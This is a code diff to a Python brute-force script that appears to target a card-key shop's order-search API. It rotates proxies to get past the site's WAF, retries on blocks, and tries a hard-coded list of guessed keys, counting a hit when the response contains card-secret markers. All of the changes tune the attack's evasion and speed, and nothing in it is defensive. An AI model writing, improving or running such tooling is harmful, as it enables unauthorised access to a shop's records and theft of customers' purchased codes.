@@ -60,9 +60,13 @@ def is_success(body):
     return any(x in body for x in ("kminfo", "卡密", "订单结果", "----"))
 
 
+def proxy_slot():
+    return WID % 20 if WID >= 20 else WID
+
+
 def fetch_proxy():
     global PROXY, PROXY_AT
-    pf = OUT / f"proxy_w{WID}.txt"
+    pf = OUT / f"proxy_w{proxy_slot()}.txt"
     if pf.exists() and time.time() - pf.stat().st_mtime < 140:
         PROXY = pf.read_text().strip()
         PROXY_AT = pf.stat().st_mtime
@@ -94,7 +98,7 @@ def fetch_proxy():
 
 def ensure_proxy():
     global PROXY, PROXY_AT
-    pf = OUT / f"proxy_w{WID}.txt"
+    pf = OUT / f"proxy_w{proxy_slot()}.txt"
     if pf.exists() and time.time() - pf.stat().st_mtime < 140:
         PROXY = pf.read_text().strip()
         PROXY_AT = pf.stat().st_mtime
@@ -117,7 +121,7 @@ def curl(url, retry=1 if TURBO else 2):
     if CURL_N % 80 == 1 or not PROXY:
         ensure_proxy()
     proxies = [PROXY] if PROXY else []
-    if not TURBO:
+    if not TURBO or os.environ.get("FAKA_DIRECT"):
         proxies.append(None)
     for px in proxies:
         for attempt in range(retry):
@@ -130,22 +134,30 @@ def curl(url, retry=1 if TURBO else 2):
                 r = subprocess.run(cmd, capture_output=True, text=True, timeout=int(CURL_TIMEOUT) + 2).stdout or ""
                 if is_auth_prompt(r) or (r.strip() and not is_waf(r)):
                     return r
-                if is_waf(r) and px:
+                if (not r.strip() or is_waf(r)) and px:
                     fetch_proxy()
-                    time.sleep(1 + attempt)
+                    time.sleep(0.5 + attempt * 0.5)
             except Exception:
+                fetch_proxy()
                 time.sleep(0.3)
     return ""
 
 
 def wait_for_site():
+    attempts = 0
     while True:
-        body = curl(f"{API}/?act=search&id=1", retry=2)
+        attempts += 1
+        ensure_proxy()
+        log(f"probe proxy {PROXY.split('@')[-1] if PROXY else 'none'}")
+        curl(BASE, retry=1)
+        body = curl(f"{API}/?act=search&id=1", retry=4 if TURBO else 2)
         if body:
             log(f"site up {body[:80]}")
             return
-        log("site down, retry 15s")
-        time.sleep(15)
+        fetch_proxy()
+        wait = 5 if TURBO else 15
+        log(f"site down, retry {wait}s (attempt {attempts})")
+        time.sleep(wait)
 
 
 def load_progress():
@@ -248,7 +260,10 @@ def main():
     log(f"FAST brute start={start} limit={limit or 'all'} threads={workers}")
 
     if WID == 0 and start == 0:
-        quick = os.environ.get("FAKA_QUICK", "fffzz,fffzzlol,admin,123456,api,kln166,KLN166,kulinan").split(",")
+        quick = os.environ.get(
+            "FAKA_QUICK",
+            "kln166,KLN166,kulinan,kln166top,admin,123456,api,fffzz,fffzzlol",
+        ).split(",")
         for k in quick:
             r = try_key(k)
             if r:
